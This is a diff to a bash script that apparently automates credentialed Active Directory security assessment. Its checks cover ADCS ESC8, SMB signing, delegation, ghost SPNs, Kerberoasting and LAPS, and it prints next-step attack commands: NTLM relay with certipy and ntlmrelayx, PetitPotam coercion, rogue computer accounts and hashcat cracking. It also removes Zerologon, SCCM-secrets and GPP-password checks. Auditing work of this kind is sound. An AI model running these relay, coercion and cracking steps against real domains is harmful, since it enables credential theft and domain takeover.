@@ -204,11 +204,13 @@ if [ ! -z "$CERTIPY_CMD" ]; then
         if [[ "${GROUPED[$name]}" =~ ESC8 ]]; then
           CA_HOST=$(echo "$name" | sed 's/CA://')
           
+          # Extract DNS Name from Certipy output
           CA_DNS=$(awk -v ca="$CA_HOST" '
             /CA Name\s*:/ { if ($NF == ca) found=1 }
             found && /DNS Name\s*:/ { print $NF; exit }
           ' "$CERTIPY_TXT")
           
+          # Fallback to CA_HOST.DOMAIN if no DNS Name found
           if [ -z "$CA_DNS" ]; then
             CA_FQDN="${CA_HOST}.${DOMAIN}"
           else
@@ -217,6 +219,7 @@ if [ ! -z "$CERTIPY_CMD" ]; then
           
           CA_IP=$(dig +short "$CA_FQDN" @$DC_IP 2>/dev/null | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | head -1)
           
+          # Extract templates suitable for Domain Controllers
           DC_TEMPLATES=$(awk '
             /Template Name\s*:/ { 
               template=$NF; 
@@ -242,7 +245,7 @@ if [ ! -z "$CERTIPY_CMD" ]; then
             echo -e "${GREY}       └─ ESC8 - DC Templates: ${DC_TEMPLATES}${NC}"
             echo -e "${GREY}          1) certipy-ad relay -target https://${CA_IP}/certsrv/certfnsh.asp -ca ${CA_HOST%%.*} -template ${FIRST_DC_TEMPLATE}${NC}"
             echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> $DC_IP${NC}"
-            echo -e "${GREY}          3) certipy-ad auth -pfx <o>.pfx -dc-ip ${DC_IP}${NC}"
+            echo -e "${GREY}          3) certipy-ad auth -pfx <output>.pfx -dc-ip ${DC_IP}${NC}"
           fi
         fi
       done
@@ -327,7 +330,7 @@ DC_IPS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
 
 # Filter out DC IPs from relay targets
 if [ -f "$OUTPUT_DIR/relay_targets_raw.txt" ]; then
-  > "$OUTPUT_DIR/relay_targets.txt"
+  > "$OUTPUT_DIR/relay_targets.txt"  # Clear file
   while IFS= read -r ip; do
     if ! echo "$DC_IPS" | grep -q "^$ip$"; then
       echo "$ip" >> "$OUTPUT_DIR/relay_targets.txt"
@@ -369,6 +372,7 @@ if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
     fi
     printf "$VULN_SMB_DCS"
     
+    # Extract first vulnerable DC IP
     FIRST_VULN_SMB_DC_IP=$(echo -e "$VULN_SMB_DCS" | head -1 | grep -oP '\d+\.\d+\.\d+\.\d+')
     
     if [ "$RELAY_COUNT" -gt 0 ]; then
@@ -387,12 +391,14 @@ if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
     echo -e "${GREEN}[OK] All DCs have SMB Signing required${NC}"
   fi
 else
+  # Fallback: single DC check
   SMB_DC_CHECK=$(netexec smb $DC_IP -u "$USERNAME" -p "$PASSWORD" 2>/dev/null)
   if echo "$SMB_DC_CHECK" | grep -q "signing:True"; then
     echo -e "${GREEN}[OK] SMB Signing required on DC${NC}"
   else
     echo -e "${RED}[KO] SMB Signing NOT required on DC${NC}"
     
+    # Primary exploit: Non-DC relay targets
     if [ "$RELAY_COUNT" -gt 0 ]; then
       echo -e "${RED}       └─ Exploitable: Coerce DC to non-DC relay targets${NC}"
       echo -e "${GREY}          1) ntlmrelayx.py -tf '$OUTPUT_DIR/relay_targets.txt' -smb2support${NC}"
@@ -401,6 +407,7 @@ else
       echo -e "${GREEN}       └─ Not exploitable via relay: No targets without SMB Signing found${NC}"
     fi
     
+    # SOCKS access - coerce any other host to DC
     echo -e "${GREY}       └─ Additionally: SOCKS Relay for share enumeration${NC}"
     echo -e "${GREY}          1) ntlmrelayx.py -t smb://${DC_IP} -smb2support -socks${NC}"
     echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> <ANY_OTHER_HOST>${NC}"
@@ -408,7 +415,7 @@ else
   fi
 fi
 
-# Unconstrained Delegation Check
+# Unconstrained Delegation Check (uses DC_SAMNAMES cached from initial DC enumeration)
 UNCON_SYSTEMS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
   -b "$DOMAIN_DN" \
   "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName 2>/dev/null | \
@@ -486,24 +493,6 @@ else
   echo -e "${GREY}[--] PetitPotam check failed${NC}"
 fi
 
-# Zerologon (CVE-2020-1472)
-ZERO_OUTPUT=$(nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" -M zerologon 2>/dev/null)
-if echo "$ZERO_OUTPUT" | grep -qi "vulnerable\|\[+\]"; then
-  echo -e "${RED}[KO] Zerologon (CVE-2020-1472) vulnerable${NC}"
-  echo -e "${GREY}       └─ cve-2020-1472-exploit.py $DC_HOSTNAME $DC_IP${NC}"
-else
-  echo -e "${GREEN}[OK] Zerologon (CVE-2020-1472) not vulnerable${NC}"
-fi
-
-# Coerce (multi-method via coerce_plus)
-COERCE_OUTPUT=$(nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -M coerce_plus 2>/dev/null)
-if echo "$COERCE_OUTPUT" | grep -qi "vulnerable\|\[+\]"; then
-  echo -e "${RED}[KO] Coerce methods available → coerce.txt${NC}"
-  echo "$COERCE_OUTPUT" > "$OUTPUT_DIR/coerce.txt"
-else
-  echo -e "${GREEN}[OK] No coerce methods available${NC}"
-fi
-
 # WPAD
 WPAD_DNS=$(nslookup wpad.$DOMAIN $DC_IP 2>&1)
 if echo "$WPAD_DNS" | grep -q "can't find"; then
@@ -537,6 +526,7 @@ fi
 DESC_OUTPUT=$(nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -M get-desc-users 2>/dev/null)
 
 if echo "$DESC_OUTPUT" | grep -q "User:"; then
+  # Extract just the user:description lines and save to file
   echo "$DESC_OUTPUT" | grep "User:" | sed 's/.*User: //' > "$OUTPUT_DIR/user_descriptions.txt"
   DESC_COUNT=$(wc -l < "$OUTPUT_DIR/user_descriptions.txt" 2>/dev/null)
   echo -e "${GREEN}[OK] $DESC_COUNT user(s) with descriptions → user_descriptions.txt${NC}"
@@ -586,40 +576,42 @@ if command -v bloodhound-python &>/dev/null || command -v bloodhound.py &>/dev/n
   $BH_CMD -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -dc "${DC_FQDN}" -ns "$DC_IP" -c $BH_MODE &>/dev/null
   cd "$CURRENT_PATH"
   
+  # Check for BloodHound JSONs
   BH_JSON=$(ls -1 "$OUTPUT_DIR"/*.json 2>/dev/null | grep -v Certipy | wc -l)
   if [ "$BH_JSON" -gt 0 ]; then
     echo "$USERNAME:password:$PASSWORD" > "$OUTPUT_DIR/owned"
-    echo -e "${GREEN}[OK] Bloodhound and owned file complete → ${BH_JSON} JSON file(s)${NC}"
+        echo -e "${GREEN}[OK] Bloodhound and owned file complete → ${BH_JSON} JSON file(s)${NC}"
 
-    if [ -f "$GRIFFON_PATH/griffon.py" ]; then
-      cd "$OUTPUT_DIR"
-      JSON_FILES=( *.json )
-      if [ ${#JSON_FILES[@]} -gt 0 ] && [ -f "${JSON_FILES[0]}" ]; then
-        GRIFFON_OUTPUT=$(python3 "$GRIFFON_PATH/griffon.py" --fromo $(ls *.json | grep -v Certipy) 2>&1)
-        GRIFFON_EXIT=$?
-        
-        if [ $GRIFFON_EXIT -ne 0 ]; then
-          echo -e "${GREY}[--] GriffonAD failed → griffon_error.txt${NC}"
-          echo "$GRIFFON_OUTPUT" > "$OUTPUT_DIR/griffon_error.txt"
-        elif echo "$GRIFFON_OUTPUT" | grep -q "No paths found"; then
-          echo -e "${GREEN}[OK] GriffonAD found no attack paths${NC}"
-        elif echo "$GRIFFON_OUTPUT" | grep -qE "(->|—>)"; then
-          PATHS=$(echo "$GRIFFON_OUTPUT" | grep -cE "(->|—>)")
-          echo -e "${RED}[KO] GriffonAD found $PATHS attack path(s) → griffon_paths.txt${NC}"
-          echo "$GRIFFON_OUTPUT" | grep -E "(->|—>)" | while read -r path; do
-            TARGET=$(echo "$path" | grep -oE '[A-Za-z0-9_$]+$')
-            echo -e "${RED}       └─ $TARGET${NC}"
-          done
-          echo "$GRIFFON_OUTPUT" > "$OUTPUT_DIR/griffon_paths.txt"
-        else
-          echo -e "${GREY}[--] GriffonAD no results → griffon_debug.txt${NC}"
-          echo "$GRIFFON_OUTPUT" > "$OUTPUT_DIR/griffon_debug.txt"
-        fi
+  # Run GriffonAD (already installed at start)
+  if [ -f "$GRIFFON_PATH/griffon.py" ]; then
+    cd "$OUTPUT_DIR"
+    JSON_FILES=( *.json )
+    if [ ${#JSON_FILES[@]} -gt 0 ] && [ -f "${JSON_FILES[0]}" ]; then
+      GRIFFON_OUTPUT=$(python3 "$GRIFFON_PATH/griffon.py" --fromo $(ls *.json | grep -v Certipy) 2>&1)
+      GRIFFON_EXIT=$?
+      
+      if [ $GRIFFON_EXIT -ne 0 ]; then
+        echo -e "${GREY}[--] GriffonAD failed → griffon_error.txt${NC}"
+        echo "$GRIFFON_OUTPUT" > "$OUTPUT_DIR/griffon_error.txt"
+      elif echo "$GRIFFON_OUTPUT" | grep -q "No paths found"; then
+        echo -e "${GREEN}[OK] GriffonAD found no attack paths${NC}"
+      elif echo "$GRIFFON_OUTPUT" | grep -qE "(->|—>)"; then
+        PATHS=$(echo "$GRIFFON_OUTPUT" | grep -cE "(->|—>)")
+        echo -e "${RED}[KO] GriffonAD found $PATHS attack path(s) → griffon_paths.txt${NC}"
+        echo "$GRIFFON_OUTPUT" | grep -E "(->|—>)" | while read -r path; do
+          TARGET=$(echo "$path" | grep -oE '[A-Za-z0-9_$]+$')
+          echo -e "${RED}       └─ $TARGET${NC}"
+        done
+        echo "$GRIFFON_OUTPUT" > "$OUTPUT_DIR/griffon_paths.txt"
+      else
+        echo -e "${GREY}[--] GriffonAD no results → griffon_debug.txt${NC}"
+        echo "$GRIFFON_OUTPUT" > "$OUTPUT_DIR/griffon_debug.txt"
       fi
-      cd "$CURRENT_PATH"
-    else
-      echo -e "${GREY}[--] GriffonAD not found${NC}"
     fi
+    cd "$CURRENT_PATH"
+  else
+    echo -e "${GREY}[--] GriffonAD not found${NC}"
+  fi
   else
     echo -e "${GREY}[--] BloodHound export failed${NC}"
   fi
@@ -632,17 +624,6 @@ CONTAINER_NAME=$(hostname)
 cd "$OUTPUT_DIR"
 zip -q bloodhound.zip *.json
 cd "$CURRENT_PATH"
-
-# SCCM/MECM Detection
-SCCM_OUTPUT=$(nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -M sccm 2>/dev/null)
-if echo "$SCCM_OUTPUT" | grep -qi "sccm\|mecm\|\[+\]"; then
-  echo -e "${RED}[KO] SCCM/MECM infrastructure detected → sccm.txt${NC}"
-  echo "$SCCM_OUTPUT" > "$OUTPUT_DIR/sccm.txt"
-  echo -e "${GREY}       └─ SharpSCCM.exe local secrets -m disk${NC}"
-  echo -e "${GREY}          SharpSCCM.exe get collections${NC}"
-else
-  echo -e "${GREEN}[OK] No SCCM/MECM infrastructure detected${NC}"
-fi
 
 echo ""
 
@@ -661,15 +642,6 @@ else
   echo -e "${GREY}[--] Could not determine MachineAccountQuota${NC}"
 fi
 
-# Pre-Windows 2000 Computer Accounts
-PRE2K_OUTPUT=$(nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -M pre2k 2>/dev/null)
-if echo "$PRE2K_OUTPUT" | grep -qi "vulnerable\|\[+\]"; then
-  echo -e "${RED}[KO] Pre-Windows 2000 computer accounts found → pre2k.txt${NC}"
-  echo "$PRE2K_OUTPUT" > "$OUTPUT_DIR/pre2k.txt"
-else
-  echo -e "${GREEN}[OK] No Pre-Windows 2000 computer accounts found${NC}"
-fi
-
 # LAPS Check
 LAPS_SCHEMA=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
   -b "CN=Schema,CN=Configuration,$DOMAIN_DN" \
@@ -680,6 +652,7 @@ LAPS_NEW_SCHEMA=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" 
   "(name=msLAPS-Password)" name 2>/dev/null | grep -c "name: msLAPS-Password")
 
 if [ "$LAPS_SCHEMA" -gt 0 ] || [ "$LAPS_NEW_SCHEMA" -gt 0 ]; then
+  # Check if we can read any LAPS passwords
   LAPS_READABLE=$(nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -M laps 2>/dev/null | grep -v "No result found" | grep -c "Password:")
   
   if [ "$LAPS_READABLE" -gt 0 ]; then
@@ -756,26 +729,32 @@ if [ ! -z "$GHOST_SPNS" ]; then
     if [[ "$spn" =~ ^[^/]+/([^:/]+) ]]; then
       spn_host="${BASH_REMATCH[1]}"
       
+      # Skip GUIDs, Azure, Microsoft domains
       [[ "$spn" =~ ^(NtFrs-|Dfsr-) ]] && continue
       [[ "$spn_host" =~ ^[0-9a-f]{8}-[0-9a-f]{4} ]] && continue
       [[ "$spn_host" =~ nsatc\.net$ ]] && continue
       [[ "$spn_host" =~ windows\.net$ ]] && continue
       [[ "$spn_host" =~ microsoft\.com$ ]] && continue
       
+      # Normalize computer name
       computer_clean="${computer%\$}"
       computer_clean="${computer_clean,,}"
       
+      # Extract hostname from SPN
       spn_hostname="${spn_host%%.*}"
       spn_hostname="${spn_hostname,,}"
       
+      # Skip if SPN matches computer name (normal)
       [[ "$spn_hostname" == "$computer_clean" ]] && continue
       
+      # Add domain if not FQDN
       if [[ ! "$spn_host" =~ \. ]]; then
         spn_fqdn="${spn_host}.${DOMAIN}"
       else
         spn_fqdn="$spn_host"
       fi
       
+      # Check DNS
       DNS_RESULT=$(dig +short +time=2 +tries=2 "$spn_fqdn" @$DC_IP 2>/dev/null)
       
       if [ -z "$DNS_RESULT" ]; then
@@ -785,22 +764,22 @@ if [ ! -z "$GHOST_SPNS" ]; then
     fi
   done <<< "$GHOST_SPNS"
   
-  if [ "$GHOST_COUNT" -gt 0 ]; then
-    echo -e "${RED}[KO] $GHOST_COUNT Ghost SPN(s) found (potential SPN hijacking)${NC}"
-    printf "$GHOST_LIST"
-    if [ ! -z "$MAQ" ] && [ "$MAQ" -gt 0 ]; then
-      FIRST_GHOST=$(echo -e "$GHOST_LIST" | head -1 | grep -oP '(?<=TERMSRV/|HOST/|RestrictedKrbHost/|HTTP/)[^$]+' | head -1)
-      if [ ! -z "$FIRST_GHOST" ]; then
-        GHOST_HOSTNAME=$(echo "$FIRST_GHOST" | cut -d'.' -f1)
-        echo -e "${GREY}       └─ addcomputer.py -computer-name '${GHOST_HOSTNAME}\$' -computer-pass 'ComplexPass123!' '$DOMAIN'/'$USERNAME':'$PASSWORD'${NC}"
-        echo -e "${GREY}       └─ GetUserSPNs.py '$DOMAIN'/'$USERNAME':'$PASSWORD' -request -dc-ip $DC_IP${NC}"
-      fi
-    else
-      echo -e "${GREY}       └─ Not exploitable: MachineAccountQuota = 0${NC}"
+if [ "$GHOST_COUNT" -gt 0 ]; then
+  echo -e "${RED}[KO] $GHOST_COUNT Ghost SPN(s) found (potential SPN hijacking)${NC}"
+  printf "$GHOST_LIST"
+  if [ ! -z "$MAQ" ] && [ "$MAQ" -gt 0 ]; then
+    FIRST_GHOST=$(echo -e "$GHOST_LIST" | head -1 | grep -oP '(?<=TERMSRV/|HOST/|RestrictedKrbHost/|HTTP/)[^$]+' | head -1)
+    if [ ! -z "$FIRST_GHOST" ]; then
+      GHOST_HOSTNAME=$(echo "$FIRST_GHOST" | cut -d'.' -f1)
+      echo -e "${GREY}       └─ addcomputer.py -computer-name '${GHOST_HOSTNAME}\$' -computer-pass 'ComplexPass123!' '$DOMAIN'/'$USERNAME':'$PASSWORD'${NC}"
+      echo -e "${GREY}       └─ GetUserSPNs.py '$DOMAIN'/'$USERNAME':'$PASSWORD' -request -dc-ip $DC_IP${NC}"
     fi
   else
-    echo -e "${GREEN}[OK] No Ghost SPNs found${NC}"
+    echo -e "${GREY}       └─ Not exploitable: MachineAccountQuota = 0${NC}"
   fi
+else
+  echo -e "${GREEN}[OK] No Ghost SPNs found${NC}"
+fi
 else
   echo -e "${GREY}[--] Could not enumerate SPNs${NC}"
 fi
@@ -815,7 +794,8 @@ if [ "$KERBEROAST_COUNT" -gt 0 ]; then
   grep -oP '(?<=\*)[^$]+(?=\$)' "$OUTPUT_DIR/kerberoast.txt" 2>/dev/null | while read -r account; do
     echo -e "${RED}       └─ $account${NC}"
   done
-  echo -e "${GREY}       └─ hashcat -m 13100 '$OUTPUT_DIR/kerberoast.txt' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule${NC}"
+    echo -e "${GREY}       └─ hashcat -m 13100 '$OUTPUT_DIR/kerberoast.txt' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule${NC}"
+
 else
   echo -e "${GREEN}[OK] No Kerberoastable accounts found${NC}"
   rm -f "$OUTPUT_DIR/kerberoast.txt"
@@ -834,15 +814,6 @@ if [ "$ASREP_COUNT" -gt 0 ]; then
 else
   echo -e "${GREEN}[OK] No AS-REP roastable accounts found${NC}"
   rm -f "$OUTPUT_DIR/asrep.txt"
-fi
-
-# GPP Passwords (SYSVOL)
-GPP_OUTPUT=$(nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" --share=SYSVOL -M gpp_password 2>/dev/null)
-if echo "$GPP_OUTPUT" | grep -qi "password\|\[+\]"; then
-  echo -e "${RED}[KO] GPP credentials found → gpp_passwords.txt${NC}"
-  echo "$GPP_OUTPUT" | grep -i "password\|\[+\]" > "$OUTPUT_DIR/gpp_passwords.txt"
-else
-  echo -e "${GREEN}[OK] No GPP passwords found${NC}"
 fi
 
 # Timeroasting Check
@@ -889,7 +860,7 @@ TRUST_COUNT=$(echo "$TRUST_DATA" | grep -c "^cn:")
 if [ "$TRUST_COUNT" -gt 0 ]; then
   echo -e "${GREY}[--] $TRUST_COUNT Domain Trust(s) found${NC}"
   
-  echo "$TRUST_DATA" | awk '
+echo "$TRUST_DATA" | awk '
     /^cn:/ { cn=$2 }
     /^trustDirection:/ { dir=$2 }
     /^trustAttributes:/ { 
@@ -921,27 +892,6 @@ else
   echo -e "${GREEN}[OK] No Domain Trusts found${NC}"
 fi
 
-# Web Screenshots
-echo ""
-echo -e "${GREY}[*] Running GoWitness...${NC}"
-mkdir -p "$OUTPUT_DIR/screenshots"
-nmap -p80,443,8080,8443 ${SUBNET}.0/24 --open -oG - 2>/dev/null | \
-  awk '/open/{print $2}' > "$OUTPUT_DIR/http_targets.txt"
-
-HTTP_COUNT=$(wc -l < "$OUTPUT_DIR/http_targets.txt" 2>/dev/null || echo 0)
-
-if [ "$HTTP_COUNT" -gt 0 ] && command -v gowitness &>/dev/null; then
-  gowitness scan file -f "$OUTPUT_DIR/http_targets.txt" --screenshot-path "$OUTPUT_DIR/screenshots/" &>/dev/null
-  SHOT_COUNT=$(ls "$OUTPUT_DIR/screenshots/"*.png 2>/dev/null | wc -l)
-  echo -e "${GREEN}[OK] GoWitness captured $SHOT_COUNT screenshot(s) → screenshots/${NC}"
-  echo -e "${GREY}       └─ Add more subnets: nmap -p80,443,8080,8443 <SUBNET>/24 --open -oG - | awk '/open/{print \$2}' >> '$OUTPUT_DIR/http_targets.txt'${NC}"
-  echo -e "${GREY}          gowitness scan file -f '$OUTPUT_DIR/http_targets.txt' --screenshot-path '$OUTPUT_DIR/screenshots/'${NC}"
-elif ! command -v gowitness &>/dev/null; then
-  echo -e "${GREY}[--] GoWitness not found, skipping screenshots${NC}"
-else
-  echo -e "${GREY}[--] No web hosts found on ${SUBNET}.0/24${NC}"
-fi
-
 # Email Security (SPF/DMARC)
 if [[ "$DOMAIN" == *.local ]]; then
   echo -e "${GREY}[--] SPD and DMARC skipped (.local domain is internal only)${NC}"
@@ -962,6 +912,24 @@ else
   else
     echo -e "${GREEN}[OK] SPF + DMARC configured${NC}"
   fi
+fi
+
+# Web Screenshots
+echo ""
+echo -e "${GREY}[*] Running GoWitness...${NC}"
+mkdir -p "$OUTPUT_DIR/screenshots"
+nmap -p80,443,8080,8443 ${SUBNET}.0/24 --open -oG - 2>/dev/null | awk '/open/{print $2}' > "$OUTPUT_DIR/http_targets.txt"
+HTTP_COUNT=$(wc -l < "$OUTPUT_DIR/http_targets.txt" 2>/dev/null || echo 0)
+if [ "$HTTP_COUNT" -gt 0 ] && command -v gowitness &>/dev/null; then
+  gowitness scan file -f "$OUTPUT_DIR/http_targets.txt" --screenshot-path "$OUTPUT_DIR/screenshots/" &>/dev/null
+  SHOT_COUNT=$(ls "$OUTPUT_DIR/screenshots/"*.png 2>/dev/null | wc -l)
+  echo -e "${GREEN}[OK] GoWitness captured $SHOT_COUNT screenshot(s) → screenshots/${NC}"
+  echo -e "${GREY}       └─ Add more subnets: nmap -p80,443,8080,8443 <SUBNET>/24 --open -oG - | awk '/open/{print \$2}' >> '$OUTPUT_DIR/http_targets.txt'${NC}"
+  echo -e "${GREY}          gowitness scan file -f '$OUTPUT_DIR/http_targets.txt' --screenshot-path '$OUTPUT_DIR/screenshots/'${NC}"
+elif ! command -v gowitness &>/dev/null; then
+  echo -e "${GREY}[--] GoWitness not found, skipping screenshots${NC}"
+else
+  echo -e "${GREY}[--] No web hosts found on ${SUBNET}.0/24${NC}"
 fi
 
 echo ""
